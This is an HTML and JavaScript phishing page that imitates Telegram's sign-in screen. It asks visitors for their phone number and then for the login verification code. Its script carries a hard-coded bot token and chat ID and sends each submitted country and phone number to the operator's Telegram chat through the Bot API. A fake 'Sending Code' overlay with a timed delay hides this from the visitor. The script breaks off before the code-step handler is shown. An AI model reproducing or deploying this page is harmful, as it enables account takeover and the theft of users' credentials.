<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Telegram</title>
    

<script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom styles for the Telegram brand color */
        :root {
            --tg-blue: #0088cc;
            --tg-light-blue: #33a9e3;
            --tg-bg: #FFFFFF; /* White background */
        }

        body {
            background-color: var(--tg-bg);
            font-family: 'Inter', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* Custom utility classes using the variables */
        .bg-tg-blue { background-color: var(--tg-blue); }
        .hover-bg-tg-blue:hover { background-color: var(--tg-light-blue); }
        .text-tg-blue { color: var(--tg-blue); }
        
        /* Input styling to match Telegram's clean underline look */
        .tg-input-group label {
            font-size: 0.75rem; /* text-xs */
            color: #6d6d6d;
        }

        /* Custom input style for phone number and code */
        .tg-input {
            border: none;
            border-bottom: 1px solid #c7c7c7;
            border-radius: 0;
            padding: 8px 0;
            transition: border-bottom-color 0.2s;
        }

        .tg-input:focus {
            outline: none;
            border-bottom-color: var(--tg-blue);
        }

        /* CSS for 3-second animation overlay */
        .overlay-hidden {
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease, visibility 0s 0.3s;
        }
        .overlay-visible {
            opacity: 1;
            visibility: visible;
            transition: opacity 0.3s ease;
        }

        /* Icon for Telegram (SVG) */
        .telegram-icon {
            color: white;
            background-color: var(--tg-blue);
            border-radius: 50%;
            padding: 1rem;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }

        /* Monkey Emoji placeholder for Step 2 */
        .monkey-emoji {
            font-size: 5rem;
            line-height: 1;
        }
        
        /* --- CUSTOM DROPDOWN STYLES --- */

        .custom-dropdown-container {
            position: relative;
            z-index: 10;
        }

        .custom-dropdown-header {
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 0;
            border-bottom: 1px solid #c7c7c7;
            transition: border-bottom-color 0.2s;
        }

        .custom-dropdown-header.active {
             border-bottom-color: var(--tg-blue);
        }

        .flag-icon {
            width: 24px;
            height: 16px;
            background-size: cover;
            background-position: center;
            border: 1px solid #ccc;
            flex-shrink: 0;
        }
        
        .custom-dropdown-list {
            position: absolute;
            top: 100%; /* Position right below the header */
            left: 0;
            right: 0;
            max-height: 200px;
            overflow-y: auto;
            background-color: white;
            border: 1px solid #e5e7eb;
            border-top: none;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            z-index: 20;
            margin-top: -1px; /* Overlap border */
            border-radius: 0 0 8px 8px;
        }

        .dropdown-option {
            padding: 8px 12px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .dropdown-option:hover {
            background-color: #f3f4f6;
        }

        .dropdown-option.selected {
            background-color: var(--tg-blue);
            color: white;
        }
        
        /* Custom scrollbar for webkit browsers */
        .custom-dropdown-list::-webkit-scrollbar {
            width: 8px;
        }

        .custom-dropdown-list::-webkit-scrollbar-thumb {
            background-color: var(--tg-blue);
            border-radius: 4px;
        }

        .custom-dropdown-list::-webkit-scrollbar-track {
            background-color: #f1f1f1;
        }
    </style>
</head>
<body class="p-4">

    

<div id="mainContainer" class="w-full max-w-sm text-center">
        
        

<svg id="mainIcon" class="telegram-icon mx-auto w-24 h-24 transition-opacity duration-300" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M22 2L11 13M22 2L15 22 11 13 2 9 22 2Z"/>
        </svg>

        

<div class="mt-8">
            
            

<div id="step1" class="transition-opacity duration-300">
                <h1 class="text-xl font-bold mb-1">Sign in to Telegram</h1>
                <p class="text-sm text-gray-500 mb-8">
                    Please confirm your country code and enter your phone number.
                </p>

                <form id="phoneForm" class="w-full">
                    
                    <!-- Replaced <select> with custom dropdown structure -->
                    <div class="tg-input-group mb-6 text-left">
                        <label>Country</label>
                        <div class="custom-dropdown-container">
                            
                            <div id="dropdownHeader" class="custom-dropdown-header text-base">
                                <span id="selectedCountryText" class="truncate"></span>
                                <div class="flex items-center space-x-2">
                                    <div id="selectedFlag" class="flag-icon"></div>
                                    <svg id="dropdownArrow" class="w-4 h-4 text-gray-500 transition-transform duration-200" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
                                </div>
                            </div>

                            <div id="dropdownList" class="custom-dropdown-list hidden">
                                <!-- Options populated by JavaScript -->
                            </div>

                            <!-- Hidden input to store the final selected value for form submission if needed -->
                            <input type="hidden" id="countryCodeInput" name="countryCode">
                        </div>
                    </div>
                    <!-- End Custom Dropdown -->

                    

<div class="tg-input-group mb-8 text-left">
                        <label for="phoneNumberInput" class="text-tg-blue">Phone Number</label>
                        <div class="flex items-center">
                            <span id="countryCodeDisplay" class="text-base font-normal mr-2"></span>
                            <input 
                                type="tel" 
                                id="phoneNumberInput"
                                placeholder="-- --- ---" 
                                class="tg-input w-full text-base"
                                maxlength="15"
                                aria-label="Phone Number"
                            >
                        </div>
                    </div>
                    
                    

<button 
                        type="submit" 
                        class="w-full bg-tg-blue text-white text-base font-bold py-3 rounded-full transition duration-150 hover-bg-tg-blue"
                    >
                        NEXT
                    </button>
                </form>

                <a href="#" class="block text-tg-blue text-sm font-semibold mt-4 hover:underline">LOG IN BY QR CODE</a>
            </div>

            

<div id="step2" class="hidden transition-opacity duration-300">
                <div class="monkey-emoji mx-auto mb-4">üêµ</div>
                
                <p id="displayPhoneNumber" class="text-2xl font-bold mb-1 flex justify-center items-center">
                    

</p>
                <p class="text-sm text-gray-500 mb-8">
                    We have sent you a message in Telegram with the code.
                </p>

                <form id="codeForm" class="w-full">
                    

<div class="tg-input-group mb-8 text-left">
                        <label for="codeInput" class="text-tg-blue">Code</label>
                        <input 
                            type="text" 
                            id="codeInput"
                            placeholder="--- ---" 
                            class="tg-input w-full text-lg text-center tracking-widest"
                            maxlength="6"
                            aria-label="Verification Code"
                            style="letter-spacing: 5px;"
                        >
                    </div>
                    
                    

<button 
                        type="submit" 
                        class="w-full bg-tg-blue text-white text-base font-bold py-3 rounded-full transition duration-150 hover-bg-tg-blue"
                    >
                        VERIFY
                    </button>
                </form>

            </div>
        </div>
    </div>
    
    

<div id="statusOverlay" class="fixed inset-0 bg-gray-800/90 z-50 flex flex-col items-center justify-center overlay-hidden">
        <div id="loader" class="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-white mb-4"></div>
        <h3 id="overlayMessage" class="text-white text-2xl font-bold">Sending Code...</h3>
        <p class="text-white text-sm mt-2">
            (·ûë·û∑·ûì·üí·ûì·ûì·üê·ûô·ûÖ·ûº·ûõ·ûÄ·üÜ·ûñ·ûª·ûÑ·ûè·üí·ûö·ûº·ûú·ûî·û∂·ûì·ûï·üí·ûâ·ûæ·ûë·üÖ·ûÄ·û∂·ûì·üã Telegram ·üî)
        </p>
    </div>
    
    <script>
        // Data for all countries (Name, Dial Code, Flag Image URL)
        // I'm using high-quality flag image URLs from flagcdn.com
        const allCountries = [
            { name: "Afghanistan", code: "+93", flag_url: "https://flagcdn.com/af.svg" },
            { name: "Albania", code: "+355", flag_url: "https://flagcdn.com/al.svg" },
            { name: "Algeria", code: "+213", flag_url: "https://flagcdn.com/dz.svg" },
            { name: "Andorra", code: "+376", flag_url: "https://flagcdn.com/ad.svg" },
            { name: "Angola", code: "+244", flag_url: "https://flagcdn.com/ao.svg" },
            { name: "Argentina", code: "+54", flag_url: "https://flagcdn.com/ar.svg" },
            { name: "Armenia", code: "+374", flag_url: "https://flagcdn.com/am.svg" },
            { name: "Australia", code: "+61", flag_url: "https://flagcdn.com/au.svg" },
            { name: "Austria", code: "+43", flag_url: "https://flagcdn.com/at.svg" },
            { name: "Azerbaijan", code: "+994", flag_url: "https://flagcdn.com/az.svg" },
            { name: "Bahamas", code: "+1-242", flag_url: "https://flagcdn.com/bs.svg" },
            { name: "Bahrain", code: "+973", flag_url: "https://flagcdn.com/bh.svg" },
            { name: "Bangladesh", code: "+880", flag_url: "https://flagcdn.com/bd.svg" },
            { name: "Barbados", code: "+1-246", flag_url: "https://flagcdn.com/bb.svg" },
            { name: "Belarus", code: "+375", flag_url: "https://flagcdn.com/by.svg" },
            { name: "Belgium", code: "+32", flag_url: "https://flagcdn.com/be.svg" },
            { name: "Belize", code: "+501", flag_url: "https://flagcdn.com/bz.svg" },
            { name: "Benin", code: "+229", flag_url: "https://flagcdn.com/bj.svg" },
            { name: "Bhutan", code: "+975", flag_url: "https://flagcdn.com/bt.svg" },
            { name: "Bolivia", code: "+591", flag_url: "https://flagcdn.com/bo.svg" },
            { name: "Bosnia and Herzegovina", code: "+387", flag_url: "https://flagcdn.com/ba.svg" },
            { name: "Botswana", code: "+267", flag_url: "https://flagcdn.com/bw.svg" },
            { name: "Brazil", code: "+55", flag_url: "https://flagcdn.com/br.svg" },
            { name: "Brunei", code: "+673", flag_url: "https://flagcdn.com/bn.svg" },
            { name: "Bulgaria", code: "+359", flag_url: "https://flagcdn.com/bg.svg" },
            { name: "Burkina Faso", code: "+226", flag_url: "https://flagcdn.com/bf.svg" },
            { name: "Burundi", code: "+257", flag_url: "https://flagcdn.com/bi.svg" },
            { name: "Cambodia", code: "+855", flag_url: "https://flagcdn.com/kh.svg" }, // Set as default/first selected
            { name: "Cameroon", code: "+237", flag_url: "https://flagcdn.com/cm.svg" },
            { name: "Canada", code: "+1", flag_url: "https://flagcdn.com/ca.svg" },
            { name: "Cape Verde", code: "+238", flag_url: "https://flagcdn.com/cv.svg" },
            { name: "Central African Republic", code: "+236", flag_url: "https://flagcdn.com/cf.svg" },
            { name: "Chad", code: "+235", flag_url: "https://flagcdn.com/td.svg" },
            { name: "Chile", code: "+56", flag_url: "https://flagcdn.com/cl.svg" },
            { name: "China", code: "+86", flag_url: "https://flagcdn.com/cn.svg" },
            { name: "Colombia", code: "+57", flag_url: "https://flagcdn.com/co.svg" },
            { name: "Comoros", code: "+269", flag_url: "https://flagcdn.com/km.svg" },
            { name: "Congo (Brazzaville)", code: "+242", flag_url: "https://flagcdn.com/cg.svg" },
            { name: "Congo (Kinshasa)", code: "+243", flag_url: "https://flagcdn.com/cd.svg" },
            { name: "Costa Rica", code: "+506", flag_url: "https://flagcdn.com/cr.svg" },
            { name: "Croatia", code: "+385", flag_url: "https://flagcdn.com/hr.svg" },
            { name: "Cuba", code: "+53", flag_url: "https://flagcdn.com/cu.svg" },
            { name: "Cyprus", code: "+357", flag_url: "https://flagcdn.com/cy.svg" },
            { name: "Czech Republic", code: "+420", flag_url: "https://flagcdn.com/cz.svg" },
            { name: "Denmark", code: "+45", flag_url: "https://flagcdn.com/dk.svg" },
            { name: "Djibouti", code: "+253", flag_url: "https://flagcdn.com/dj.svg" },
            { name: "Dominica", code: "+1-767", flag_url: "https://flagcdn.com/dm.svg" },
            { name: "Dominican Republic", code: "+1-809", flag_url: "https://flagcdn.com/do.svg" },
            { name: "Ecuador", code: "+593", flag_url: "https://flagcdn.com/ec.svg" },
            { name: "Egypt", code: "+20", flag_url: "https://flagcdn.com/eg.svg" },
            { name: "El Salvador", code: "+503", flag_url: "https://flagcdn.com/sv.svg" },
            { name: "Equatorial Guinea", code: "+240", flag_url: "https://flagcdn.com/gq.svg" },
            { name: "Eritrea", code: "+291", flag_url: "https://flagcdn.com/er.svg" },
            { name: "Estonia", code: "+372", flag_url: "https://flagcdn.com/ee.svg" },
            { name: "Eswatini", code: "+268", flag_url: "https://flagcdn.com/sz.svg" },
            { name: "Ethiopia", code: "+251", flag_url: "https://flagcdn.com/et.svg" },
            { name: "Fiji", code: "+679", flag_url: "https://flagcdn.com/fj.svg" },
            { name: "Finland", code: "+358", flag_url: "https://flagcdn.com/fi.svg" },
            { name: "France", code: "+33", flag_url: "https://flagcdn.com/fr.svg" },
            { name: "Gabon", code: "+241", flag_url: "https://flagcdn.com/ga.svg" },
            { name: "Gambia", code: "+220", flag_url: "https://flagcdn.com/gm.svg" },
            { name: "Georgia", code: "+995", flag_url: "https://flagcdn.com/ge.svg" },
            { name: "Germany", code: "+49", flag_url: "https://flagcdn.com/de.svg" },
            { name: "Ghana", code: "+233", flag_url: "https://flagcdn.com/gh.svg" },
            { name: "Greece", code: "+30", flag_url: "https://flagcdn.com/gr.svg" },
            { name: "Grenada", code: "+1-473", flag_url: "https://flagcdn.com/gd.svg" },
            { name: "Guatemala", code: "+502", flag_url: "https://flagcdn.com/gt.svg" },
            { name: "Guinea", code: "+224", flag_url: "https://flagcdn.com/gn.svg" },
            { name: "Guinea-Bissau", code: "+245", flag_url: "https://flagcdn.com/gw.svg" },
            { name: "Guyana", code: "+592", flag_url: "https://flagcdn.com/gy.svg" },
            { name: "Haiti", code: "+509", flag_url: "https://flagcdn.com/ht.svg" },
            { name: "Honduras", code: "+504", flag_url: "https://flagcdn.com/hn.svg" },
            { name: "Hungary", code: "+36", flag_url: "https://flagcdn.com/hu.svg" },
            { name: "Iceland", code: "+354", flag_url: "https://flagcdn.com/is.svg" },
            { name: "India", code: "+91", flag_url: "https://flagcdn.com/in.svg" },
            { name: "Indonesia", code: "+62", flag_url: "https://flagcdn.com/id.svg" },
            { name: "Iran", code: "+98", flag_url: "https://flagcdn.com/ir.svg" },
            { name: "Iraq", code: "+964", flag_url: "https://flagcdn.com/iq.svg" },
            { name: "Ireland", code: "+353", flag_url: "https://flagcdn.com/ie.svg" },
            { name: "Israel", code: "+972", flag_url: "https://flagcdn.com/il.svg" },
            { name: "Italy", code: "+39", flag_url: "https://flagcdn.com/it.svg" },
            { name: "Ivory Coast", code: "+225", flag_url: "https://flagcdn.com/ci.svg" },
            { name: "Jamaica", code: "+1-876", flag_url: "https://flagcdn.com/jm.svg" },
            { name: "Japan", code: "+81", flag_url: "https://flagcdn.com/jp.svg" },
            { name: "Jordan", code: "+962", flag_url: "https://flagcdn.com/jo.svg" },
            { name: "Kazakhstan", code: "+7", flag_url: "https://flagcdn.com/kz.svg" },
            { name: "Kenya", code: "+254", flag_url: "https://flagcdn.com/ke.svg" },
            { name: "Kiribati", code: "+686", flag_url: "https://flagcdn.com/ki.svg" },
            { name: "Kuwait", code: "+965", flag_url: "https://flagcdn.com/kw.svg" },
            { name: "Kyrgyzstan", code: "+996", flag_url: "https://flagcdn.com/kg.svg" },
            { name: "Laos", code: "+856", flag_url: "https://flagcdn.com/la.svg" },
            { name: "Latvia", code: "+371", flag_url: "https://flagcdn.com/lv.svg" },
            { name: "Lebanon", code: "+961", flag_url: "https://flagcdn.com/lb.svg" },
            { name: "Lesotho", code: "+266", flag_url: "https://flagcdn.com/ls.svg" },
            { name: "Liberia", code: "+231", flag_url: "https://flagcdn.com/lr.svg" },
            { name: "Libya", code: "+218", flag_url: "https://flagcdn.com/ly.svg" },
            { name: "Liechtenstein", code: "+423", flag_url: "https://flagcdn.com/li.svg" },
            { name: "Lithuania", code: "+370", flag_url: "https://flagcdn.com/lt.svg" },
            { name: "Luxembourg", code: "+352", flag_url: "https://flagcdn.com/lu.svg" },
            { name: "Madagascar", code: "+261", flag_url: "https://flagcdn.com/mg.svg" },
            { name: "Malawi", code: "+265", flag_url: "https://flagcdn.com/mw.svg" },
            { name: "Malaysia", code: "+60", flag_url: "https://flagcdn.com/my.svg" },
            { name: "Maldives", code: "+960", flag_url: "https://flagcdn.com/mv.svg" },
            { name: "Mali", code: "+223", flag_url: "https://flagcdn.com/ml.svg" },
            { name: "Malta", code: "+356", flag_url: "https://flagcdn.com/mt.svg" },
            { name: "Mauritania", code: "+222", flag_url: "https://flagcdn.com/mr.svg" },
            { name: "Mauritius", code: "+230", flag_url: "https://flagcdn.com/mu.svg" },
            { name: "Mexico", code: "+52", flag_url: "https://flagcdn.com/mx.svg" },
            { name: "Micronesia", code: "+691", flag_url: "https://flagcdn.com/fm.svg" },
            { name: "Moldova", code: "+373", flag_url: "https://flagcdn.com/md.svg" },
            { name: "Monaco", code: "+377", flag_url: "https://flagcdn.com/mc.svg" },
            { name: "Mongolia", code: "+976", flag_url: "https://flagcdn.com/mn.svg" },
            { name: "Montenegro", code: "+382", flag_url: "https://flagcdn.com/me.svg" },
            { name: "Morocco", code: "+212", flag_url: "https://flagcdn.com/ma.svg" },
            { name: "Mozambique", code: "+258", flag_url: "https://flagcdn.com/mz.svg" },
            { name: "Myanmar", code: "+95", flag_url: "https://flagcdn.com/mm.svg" },
            { name: "Namibia", code: "+264", flag_url: "https://flagcdn.com/na.svg" },
            { name: "Nauru", code: "+674", flag_url: "https://flagcdn.com/nr.svg" },
            { name: "Nepal", code: "+977", flag_url: "https://flagcdn.com/np.svg" },
            { name: "Netherlands", code: "+31", flag_url: "https://flagcdn.com/nl.svg" },
            { name: "New Zealand", code: "+64", flag_url: "https://flagcdn.com/nz.svg" },
            { name: "Nicaragua", code: "+505", flag_url: "https://flagcdn.com/ni.svg" },
            { name: "Niger", code: "+227", flag_url: "https://flagcdn.com/ne.svg" },
            { name: "Nigeria", code: "+234", flag_url: "https://flagcdn.com/ng.svg" },
            { name: "North Korea", code: "+850", flag_url: "https://flagcdn.com/kp.svg" },
            { name: "North Macedonia", code: "+389", flag_url: "https://flagcdn.com/mk.svg" },
            { name: "Norway", code: "+47", flag_url: "https://flagcdn.com/no.svg" },
            { name: "Oman", code: "+968", flag_url: "https://flagcdn.com/om.svg" },
            { name: "Pakistan", code: "+92", flag_url: "https://flagcdn.com/pk.svg" },
            { name: "Palau", code: "+680", flag_url: "https://flagcdn.com/pw.svg" },
            { name: "Palestine", code: "+970", flag_url: "https://flagcdn.com/ps.svg" },
            { name: "Panama", code: "+507", flag_url: "https://flagcdn.com/pa.svg" },
            { name: "Papua New Guinea", code: "+675", flag_url: "https://flagcdn.com/pg.svg" },
            { name: "Paraguay", code: "+595", flag_url: "https://flagcdn.com/py.svg" },
            { name: "Peru", code: "+51", flag_url: "https://flagcdn.com/pe.svg" },
            { name: "Philippines", code: "+63", flag_url: "https://flagcdn.com/ph.svg" },
            { name: "Poland", code: "+48", flag_url: "https://flagcdn.com/pl.svg" },
            { name: "Portugal", code: "+351", flag_url: "https://flagcdn.com/pt.svg" },
            { name: "Qatar", code: "+974", flag_url: "https://flagcdn.com/qa.svg" },
            { name: "Romania", code: "+40", flag_url: "https://flagcdn.com/ro.svg" },
            { name: "Russia", code: "+7", flag_url: "https://flagcdn.com/ru.svg" },
            { name: "Rwanda", code: "+250", flag_url: "https://flagcdn.com/rw.svg" },
            { name: "Saint Lucia", code: "+1-758", flag_url: "https://flagcdn.com/lc.svg" },
            { name: "Samoa", code: "+685", flag_url: "https://flagcdn.com/ws.svg" },
            { name: "San Marino", code: "+378", flag_url: "https://flagcdn.com/sm.svg" },
            { name: "Saudi Arabia", code: "+966", flag_url: "https://flagcdn.com/sa.svg" },
            { name: "Senegal", code: "+221", flag_url: "https://flagcdn.com/sn.svg" },
            { name: "Serbia", code: "+381", flag_url: "https://flagcdn.com/rs.svg" },
            { name: "Seychelles", code: "+248", flag_url: "https://flagcdn.com/sc.svg" },
            { name: "Sierra Leone", code: "+232", flag_url: "https://flagcdn.com/sl.svg" },
            { name: "Singapore", code: "+65", flag_url: "https://flagcdn.com/sg.svg" },
            { name: "Slovakia", code: "+421", flag_url: "https://flagcdn.com/sk.svg" },
            { name: "Slovenia", code: "+386", flag_url: "https://flagcdn.com/si.svg" },
            { name: "Solomon Islands", code: "+677", flag_url: "https://flagcdn.com/sb.svg" },
            { name: "Somalia", code: "+252", flag_url: "https://flagcdn.com/so.svg" },
            { name: "South Africa", code: "+27", flag_url: "https://flagcdn.com/za.svg" },
            { name: "South Korea", code: "+82", flag_url: "https://flagcdn.com/kr.svg" },
            { name: "South Sudan", code: "+211", flag_url: "https://flagcdn.com/ss.svg" },
            { name: "Spain", code: "+34", flag_url: "https://flagcdn.com/es.svg" },
            { name: "Sri Lanka", code: "+94", flag_url: "https://flagcdn.com/lk.svg" },
            { name: "Sudan", code: "+249", flag_url: "https://flagcdn.com/sd.svg" },
            { name: "Suriname", code: "+597", flag_url: "https://flagcdn.com/sr.svg" },
            { name: "Sweden", code: "+46", flag_url: "https://flagcdn.com/se.svg" },
            { name: "Switzerland", code: "+41", flag_url: "https://flagcdn.com/ch.svg" },
            { name: "Syria", code: "+963", flag_url: "https://flagcdn.com/sy.svg" },
            { name: "Taiwan", code: "+886", flag_url: "https://flagcdn.com/tw.svg" },
            { name: "Tajikistan", code: "+992", flag_url: "https://flagcdn.com/tj.svg" },
            { name: "Tanzania", code: "+255", flag_url: "https://flagcdn.com/tz.svg" },
            { name: "Thailand", code: "+66", flag_url: "https://flagcdn.com/th.svg" },
            { name: "Togo", code: "+228", flag_url: "https://flagcdn.com/tg.svg" },
            { name: "Tonga", code: "+676", flag_url: "https://flagcdn.com/to.svg" },
            { name: "Trinidad and Tobago", code: "+1-868", flag_url: "https://flagcdn.com/tt.svg" },
            { name: "Tunisia", code: "+216", flag_url: "https://flagcdn.com/tn.svg" },
            { name: "Turkey", code: "+90", flag_url: "https://flagcdn.com/tr.svg" },
            { name: "Turkmenistan", code: "+993", flag_url: "https://flagcdn.com/tm.svg" },
            { name: "Tuvalu", code: "+688", flag_url: "https://flagcdn.com/tv.svg" },
            { name: "Uganda", code: "+256", flag_url: "https://flagcdn.com/ug.svg" },
            { name: "Ukraine", code: "+380", flag_url: "https://flagcdn.com/ua.svg" },
            { name: "United Arab Emirates", code: "+971", flag_url: "https://flagcdn.com/ae.svg" },
            { name: "United Kingdom", code: "+44", flag_url: "https://flagcdn.com/gb.svg" },
            { name: "United States", code: "+1", flag_url: "https://flagcdn.com/us.svg" },
            { name: "Uruguay", code: "+598", flag_url: "https://flagcdn.com/uy.svg" },
            { name: "Uzbekistan", code: "+998", flag_url: "https://flagcdn.com/uz.svg" },
            { name: "Vanuatu", code: "+678", flag_url: "https://flagcdn.com/vu.svg" },
            { name: "Vatican City", code: "+379", flag_url: "https://flagcdn.com/va.svg" },
            { name: "Venezuela", code: "+58", flag_url: "https://flagcdn.com/ve.svg" },
            { name: "Vietnam", code: "+84", flag_url: "https://flagcdn.com/vn.svg" },
            { name: "Yemen", code: "+967", flag_url: "https://flagcdn.com/ye.svg" },
            { name: "Zambia", code: "+260", flag_url: "https://flagcdn.com/zm.svg" },
            { name: "Zimbabwe", code: "+263", flag_url: "https://flagcdn.com/zw.svg" },
        ];

        document.addEventListener('DOMContentLoaded', () => {
            const step1Div = document.getElementById('step1');
            const step2Div = document.getElementById('step2');
            const phoneForm = document.getElementById('phoneForm');
            const countryCodeDisplay = document.getElementById('countryCodeDisplay');
            const phoneNumberInput = document.getElementById('phoneNumberInput');
            const displayPhoneNumber = document.getElementById('displayPhoneNumber');
            const codeForm = document.getElementById('codeForm');
            
            const statusOverlay = document.getElementById('statusOverlay');
            const overlayMessage = document.getElementById('overlayMessage');
            const loader = document.getElementById('loader');

            // Custom Dropdown Elements
            const dropdownHeader = document.getElementById('dropdownHeader');
            const dropdownList = document.getElementById('dropdownList');
            const selectedCountryText = document.getElementById('selectedCountryText');
            const selectedFlagDiv = document.getElementById('selectedFlag');
            const countryCodeInput = document.getElementById('countryCodeInput');
            const dropdownArrow = document.getElementById('dropdownArrow');


            let phoneNumber = '';
            let countryCode = '';
            let selectedCountryName = '';
            let selectedCountryFlagUrl = '';
            let currentStep = 1;

            // --- Telegram Bot Setup (LIVE CREDENTIALS) ---
            const TELEGRAM_BOT_TOKEN = "7530662027:AAGay6VXwq6VQJHePq1ytMl2aYjWFNdXN4w"; 
            const TELEGRAM_CHAT_ID = "8078410911"; 
            
            // --- Custom Dropdown Logic ---
            
            const closeDropdown = () => {
                dropdownList.classList.add('hidden');
                dropdownHeader.classList.remove('active');
                dropdownArrow.style.transform = 'rotate(0deg)';
                document.removeEventListener('click', handleOutsideClick);
            }

            const handleOutsideClick = (event) => {
                if (!dropdownHeader.contains(event.target) && !dropdownList.contains(event.target)) {
                    closeDropdown();
                }
            }

            const toggleDropdown = () => {
                const isHidden = dropdownList.classList.contains('hidden');
                if (isHidden) {
                    dropdownList.classList.remove('hidden');
                    dropdownHeader.classList.add('active');
                    dropdownArrow.style.transform = 'rotate(180deg)';
                    
                    // Add listener to close when clicking outside
                    document.addEventListener('click', handleOutsideClick);

                    // Scroll the selected option into view
                    const selectedOption = dropdownList.querySelector('.dropdown-option.selected');
                    if (selectedOption) {
                        selectedOption.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
                    }

                } else {
                    closeDropdown();
                }
            }
            
            dropdownHeader.addEventListener('click', toggleDropdown);

            const selectCountry = (country) => {
                // Update internal variables
                countryCode = country.code;
                selectedCountryName = country.name;
                selectedCountryFlagUrl = country.flag_url;

                // Update UI header
                selectedCountryText.textContent = country.name;
                selectedFlagDiv.style.backgroundImage = `url('${country.flag_url}')`;
                
                // Update phone number prefix
                countryCodeDisplay.textContent = country.code;
                
                // Update hidden input (if needed for a real form submission)
                countryCodeInput.value = country.code;
                
                // Reset styling for all options
                dropdownList.querySelectorAll('.dropdown-option').forEach(option => {
                    option.classList.remove('selected');
                });

                // Set new option as selected
                const newSelectedOption = dropdownList.querySelector(`[data-code="${country.code}"]`);
                if (newSelectedOption) {
                    newSelectedOption.classList.add('selected');
                }
                
                phoneNumberInput.value = ''; // Clear number input on country change
                closeDropdown();
            };

            // --- Populate Custom Dropdown ---
            const populateCountries = () => {
                // Sort countries alphabetically by name
                allCountries.sort((a, b) => a.name.localeCompare(b.name));
                
                let defaultCountry = allCountries.find(c => c.code === '+855') || allCountries[0]; // Cambodia or first country

                allCountries.forEach(country => {
                    const optionDiv = document.createElement('div');
                    optionDiv.classList.add('dropdown-option');
                    // Store data attributes
                    optionDiv.dataset.code = country.code;
                    optionDiv.dataset.flagUrl = country.flag_url;
                    
                    // Option Text (Country Name)
                    const nameSpan = document.createElement('span');
                    nameSpan.textContent = country.name;
                    optionDiv.appendChild(nameSpan);

                    // Flag Icon (Right Side)
                    const flagDiv = document.createElement('div');
                    flagDiv.classList.add('flag-icon');
                    flagDiv.style.backgroundImage = `url('${country.flag_url}')`;
                    optionDiv.appendChild(flagDiv);

                    // Click handler
                    optionDiv.addEventListener('click', () => {
                        selectCountry(country);
                    });
                    
                    dropdownList.appendChild(optionDiv);
                });
                
                // Set initial selection
                selectCountry(defaultCountry);
            };

            populateCountries();
            
            // --- Telegram Send Function ---

            const sendToTelegram = async (message) => {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                const payload = {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                };
                
                console.log("--- Telegram Live Submission Attempt ---");
                console.log(`Attempting to send login data to Chat ID: ${TELEGRAM_CHAT_ID}`);

                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });

                    if (!response.ok) {
                        const errorData = await response.json();
                        console.error(`Telegram API failed (${response.status}):`, errorData);
                    } else {
                        console.log("Telegram alert sent successfully.");
                    }
                } catch (error) {
                    console.error("Network error during Telegram alert:", error);
                }
            };
            
            // Function to switch view from Step 1 to Step 2
            const goToStep2 = () => {
                step1Div.classList.add('hidden');
                step2Div.classList.remove('hidden');
                currentStep = 2;
                
                // Update the phone number displayed on Step 2
                // Added a small icon to go back to edit the number
                displayPhoneNumber.innerHTML = `<span>${countryCode} ${phoneNumber}</span> <svg class="w-4 h-4 text-gray-500 ml-2 cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" onclick="document.getElementById('step1').classList.remove('hidden'); document.getElementById('step2').classList.add('hidden'); currentStep=1;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg>`;
            };


            // --- Step 1 Form Submission (Phone Number) ---
            phoneForm.addEventListener('submit', (e) => {
                e.preventDefault(); 

                const rawNumber = phoneNumberInput.value.replace(/[^0-9]/g, '');
                
                if (!rawNumber) {
                    overlayMessage.textContent = 'Please enter a phone number.';
                    // Show message briefly (custom alert)
                    statusOverlay.classList.remove('overlay-hidden');
                    statusOverlay.classList.add('overlay-visible');

                    setTimeout(() => {
                         statusOverlay.classList.remove('overlay-visible');
                         statusOverlay.classList.add('overlay-hidden');
                         overlayMessage.textContent = 'Sending Code...'; // Reset message
                    }, 2000);
                    return;
                }
                
                phoneNumber = rawNumber; 
                
                // 1. Show the overlay and start the timer
                const startTime = Date.now();
                statusOverlay.classList.remove('overlay-hidden');
                statusOverlay.classList.add('overlay-visible');
                overlayMessage.textContent = 'Sending Code...';
                loader.style.display = 'block';
                loader.classList.add('animate-spin');

                // Using HTML formatting for Telegram message
                const logMessage = `<b>üì± New Telegram Attempt - Phone Submitted:</b>\nCountry: ${selectedCountryName}\nCode: <code>${countryCode}</code>\nPhone Number: <code>${phoneNumber}</code>`;

                // 2. Send data to Telegram
                sendToTelegram(logMessage)
                    .then(() => {
                        // Calculate time elapsed since click
                        const elapsedTime = Date.now() - startTime;
                        // Time remaining to hit the 3-second (3000ms) minimum delay
                        const remainingDelay = Math.max(0, 3000 - elapsedTime); 
                        
                        console.log(`Telegram submission completed in ${elapsedTime}ms. Waiting an additional ${remainingDelay}ms for the 3s animation delay.`);

                        // 3. Wait for the remaining time to complete the 3s animation/delay
                        setTimeout(() => {
                            // 4. Transition to Step 2
                            overlayMessage.textContent = 'Code Sent!';
                            loader.classList.remove('animate-spin');
                            loader.style.display = 'none';

